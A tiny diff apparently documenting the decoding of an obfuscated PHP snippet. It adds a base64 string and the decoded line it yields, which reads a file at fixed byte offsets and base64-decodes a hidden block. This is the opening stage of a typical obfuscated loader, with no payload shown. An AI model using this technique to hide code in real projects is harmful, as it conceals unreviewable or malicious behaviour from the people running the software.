@@ -1,0 +1,5 @@
+JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbDExbDExbDExbDEsJ3JiJyk7ZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjE2MCk7JGxsMWxsbGwxMTExMTExMWw9ZXhwbG9kZSgiXHQiLGJhc2U2NF9kZWNvZGUoZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjcyKSkpOw==
+
+decode
+
+$ll11lll11llll11l=fopen($lll11l11l11l11l1,'rb');fread($ll11lll11llll11l,2160);$ll1llll11111111l=explode("\t",base64_decode(fread($ll11lll11llll11l,272)));
